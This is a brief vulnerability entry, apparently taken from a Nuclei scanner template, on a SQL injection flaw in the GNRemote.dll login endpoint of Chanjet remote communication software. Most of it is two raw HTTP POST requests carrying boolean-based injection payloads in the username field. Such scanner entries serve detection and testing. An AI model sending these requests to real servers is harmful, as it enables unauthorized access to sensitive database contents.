# Vulnerability: Changjietong Remote Communication GNRemote.dll - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`chanjet-gnremote-sqli.yaml`)

## Description
Chanjetong has a SQL injection vulnerability, which can be used by attackers to obtain sensitive information in the database.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /GNRemote.dll?GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

username=%22'%20or%201%3d1%3b%22&password=%018d8cbc8bfc24f018&ClientStatus=1

POST /GNRemote.dll?GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

username=%22'%20or%201%3d2%3b%22&password=%018d8cbc8bfc24f018&ClientStatus=1
```

